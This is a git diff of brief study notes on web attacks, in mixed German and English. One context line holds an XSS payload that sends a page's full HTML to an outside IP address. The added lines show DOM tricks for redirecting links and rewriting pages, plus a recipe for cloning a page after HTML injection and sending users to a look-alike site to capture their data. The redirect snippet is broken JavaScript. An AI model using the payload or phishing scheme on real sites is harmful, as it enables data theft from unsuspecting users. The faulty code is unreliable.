@@ -19,6 +19,9 @@ https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
 <script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>
 ```
 
+`document.getElementById('some_id').href('google.com')` damit würden wir ein href der auf irgendeine Seite verlinkt umleiten auf eine von uns definierte Seit. (https://www.youtube.com/watch?v=uTYDPolEuBo)
+`document.body.innerHTML = '<h1>Ganze Seite durch eigenes HTML ersetzen</h1>'`
+
 # Brute-force attack
 Is possible because we do not check how many requests have been sent by one user
 
@@ -37,3 +40,6 @@ Password:<br>
 <br>
 <input type="submit" value="Login"></br>
 ```
+
+Quelltext der Seite auf der man HMTL Injection macht kopieren. Dann den Nutzer umleiten auf eine von sich gehostete Seite welche genau so aussieht wie die
+ursprungsseite. Dort aber Daten abfangen etc. (https://www.youtube.com/watch?v=uTYDPolEuBo)
